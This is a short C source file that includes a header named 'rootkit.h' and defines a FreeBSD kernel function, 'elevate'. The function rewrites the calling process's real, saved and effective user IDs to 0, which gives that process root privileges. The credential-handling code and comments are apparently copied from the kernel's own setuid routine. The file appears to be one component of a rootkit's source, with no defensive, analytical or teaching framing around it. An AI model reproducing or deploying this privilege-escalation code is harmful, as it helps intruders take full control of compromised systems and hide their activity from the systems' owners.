#include "rootkit.h"

void elevate(struct thread *td) {
	struct proc *p = td->td_proc;
	struct ucred *newcred, *oldcred;
	uid_t uid;
	struct uidinfo *uip;

	uid = 0;
	newcred = crget();
	uip = uifind(uid);
	PROC_LOCK(p);
	/*
	 * Copy credentials so other references do not see our changes.
	 */
	oldcred = crcopysafe(p, newcred);

	/*
	* Set the real uid and transfer proc count to new user.
	*/
	change_ruid(newcred, uip);
	/*
	* Set saved uid
	*
	* XXX always set saved uid even if not _POSIX_SAVED_IDS, as
	* the security of seteuid() depends on it.  B.4.2.2 says it
	* is important that we should do this.
	*/
	change_svuid(newcred, uid);

	/*
	 * In all permitted cases, we are changing the euid.
	 */
	change_euid(newcred, uip);
	setsugid(p);
	proc_set_cred(p, newcred);

	PROC_UNLOCK(p);

	uifree(uip);
	crfree(oldcred);
}
